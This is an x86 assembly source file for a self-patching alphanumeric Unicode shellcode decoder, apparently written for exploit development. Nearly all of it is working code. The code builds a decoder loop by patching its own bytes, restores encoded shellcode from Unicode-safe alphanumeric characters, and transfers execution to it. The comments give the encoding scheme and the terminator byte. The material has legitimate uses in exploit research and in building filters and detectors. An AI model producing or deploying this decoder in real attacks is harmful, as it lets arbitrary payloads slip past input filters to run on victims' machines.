BITS 32
;    The code will "add-patch" it's own last bytes into a decoder loop, this
;    decoder loop will then convert the string behind it from alphanumeric
;    unicode characters back to the origional shellcode untill it reaches the
;    character 'A'. Execution is then transfered to the decoded shellcode.
;  Encoding scheme for origional shellcode:
;    Every byte 0xAB is encoded in two unicode words:  (CD 00) and (EF 00)
;    Where F = B and E is arbitrary (3-7) as long as EF is alphanumeric,
;    D = A-E and C is arbitrary (3-7) as long as CD is alphanumeric.
;    The encoded data is terminated by a "A" (0x41) character, DO NOT USE THIS
;    in your encoded shellcode data, as it will stop the decoding!


; allignment null -> byte
global _shellcode
_shellcode:
global shellcode
shellcode:
    ; Now we have to get a register to point to our decoder loop, so we can
    ; start patching. Assuming ECX points to the baseaddress of this code,
    ; the decoder loop will be around ECX+0x100. Since our limited instruction
    ; set does not include a direct way to add a value to a register, we have
    ; to do this in another way:
    XOR     AL, 0                       ;   
    XOR     AL, 0                       ;
    XOR     AL, 0                       ;
    XOR     AL, 0                       ;
    XOR     AL, 0                       ;
    XOR     AL, 0                       ;
    XOR     AL, 0                       ;
    XOR     AL, 0                       ;
    XOR     AL, 0                       ;
    XOR     AL, 0                       ;
    XOR     AL, 0                       ;
    XOR     AL, 0                       ;
    XOR     AL, 0                       ;
    XOR     AL, 0                       ;
    PUSH    ECX                         ;                        > A4A3A2A1
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    PUSH    ESP                         ;               > s4s3s2s1 A4A3A2A1
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    POP     EAX                         ; eax = 0xs1s2s3s4 (*stack)
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    POP     EDX                         ; edx = 0xA1A2A3A4 (baseaddress)
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    PUSH    EAX                         ;                        > s4s3s2s1
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    XOR     EAX, [EAX]                  ; eax = 0
    ; Add 0x100 to the baseaddress (0xA1A2A3A4)
    PUSH    ECX                         ;                > A4A3A2A1s4s3s2s1
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    INC     ESP                         ;                  > A3A2A1s4s3s2s1
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    POP     EDX                         ; ecx = 0xs4A1A2A3
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    INC     EDX                         ; ecx = 0xs4B1B2B3
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    PUSH    EDX                         ;                  > B3B2B1s4s3s2s1
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    DEC     ESP                         ;                > A4B3B2B1s4s3s2s1
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    POP     ECX                         ; ecx = baseaddress+0x100
    ; Patch 35 00 -> 75 00       JNZ     loop
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    DEC     ECX                         ;
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    PUSH    ECX                         ;               > (data-1) s4s3s2s1
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    DEC     ECX                         ;
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    PUSH    ECX                         ;      > (data-2) (data-1) s4s3s2s1
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    PUSH    EAX                         ;    > 0 (data-2) (data-1) s4s3s2s1
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    XOR     EAX, 0x41004100             ; ah = 0x41
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    PUSH    EAX                         ;
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    POP     EDX                         ; dh = 0x41
    ADD     [ECX], DH                   ; 34 -> 75
    ; Patch 00 39 00 -> 8039 41     CMP   B[ECX], 41
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    DEC     ECX                         ;
    ADD     [ECX], DH                   ; 00 -> 41
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    DEC     ECX                         ;
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    DEC     ECX                         ;
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    DEC     EDX                         ; dh = 0x40, dl = -1
    ADD     [ECX], DH                   ; 00 -> 40
    ADD     [ECX], DH                   ; 40 -> 80
    ; Patch 47 00 -> 8802        MOV     [EDX], AL
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    DEC     ECX                         ;
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    DEC     ECX                         ;
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    POP     EAX                         ; ah = 0 > (data-2) (data-1) s4s...
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    XOR     EAX, 0x41003800             ; ah = 0x38
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    PUSH    EAX                         ;
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    POP     EDX                         ; dh = 0x38, dl = 0
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    INC     EDX                         ; dl = 1
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    INC     EDX                         ; dl = 2
    db      0, 0x51, 0 ; ADD  [ECX+0], DL ; 00 -> 02
    DEC     ECX                         ;
    ADD     [ECX], DH                   ; 50 -> 88
    ; Patch 00 41 00 -> 0241 02  ADD     AL, [edx+2]
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    DEC     ECX                         ;
    db      0, 0x51, 0 ; ADD  [ECX+0], DL ; 00 -> 02
    DEC     ECX                         ;
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    DEC     ECX                         ;
    db      0, 0x51, 0 ; ADD  [ECX+0], DL ; 00 -> 02
    ; Patch 33 00 30 -> 6B01 10     IMUL  EAX, [ECX], 10
    DEC     ECX                         ;
    ADD     [ECX], DH                   ; 30 -> 68
    ADD     [ECX], DH                   ; 68 -> A0
    ADD     [ECX], DH                   ; A0 -> D8
    ADD     [ECX], DH                   ; D8 -> 10
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    DEC     ECX                         ;
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    DEC     EDX                         ; dl = 1
    db      0, 0x51, 0 ; ADD  [ECX+0], DL ; 00 -> 01
    DEC     ECX                         ;
    ADD     [ECX], DH                   ; 33 -> 6B
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    POP     ECX                         ; ecx = data-2  > (data-1) s4s3s2s1
                    db 0x00, 0x41, 0x00 ;NOP - ADD [ECX+0], AL
    POP     EDX                         ; edx = data-1           > s4s3s2s1
    ; This is the part we are patching to create the unicode decoder loop:
                    db 0x00, 0x42, 0x00 ;NOP - ADD [EDX+0], AL
    INC     ECX                         ; we start with base-2
                    db 0x00, 0x42, 0x00 ;NOP - ADD [EDX+0], AL
    INC     ECX                         ; which means the first converted
                    db 0x00, 0x42, 0x00 ;NOP - ADD [EDX+0], AL
    INC     ECX                         ; char will be ar base+2, so there
                    db 0x00, 0x42, 0x00 ;NOP - ADD [EDX+0], AL
    INC     ECX                         ; is a nop char behind the decoder
                    db 0x00, 0x42, 0x00 ;NOP - ADD [EDX+0], AL 
    db      0x33, 0x00, 0x30            ; 6B01 10     IMUL  EAX, [ECX], 10
    db      0x00, 0x41, 0x00            ; 0241 02     ADD   AL, [ECX+2]
    db      0x50, 0x00                  ; 8802        MOV   [EDX], AL
    INC     EDX                         ; 
    db      0x00, 0x39, 0x00            ; 8039 41     CMP   BYTE PTR [ECX], 41
    db      0x34, 0                     ; 75 E2       JNZ   loop

    ; Completely useless nop for alligning data behind the decoder
    XOR     AL, 0                       ;
    ; First decoded byte will be used for the loop offset.
    db      0x4A, 0, 0x42, 0            ; "E2"        JNZ   loop
;      " .byte 0x48, 0, 0x4C, 0                ; "CC"
;      " .byte 0x41, 0      ;
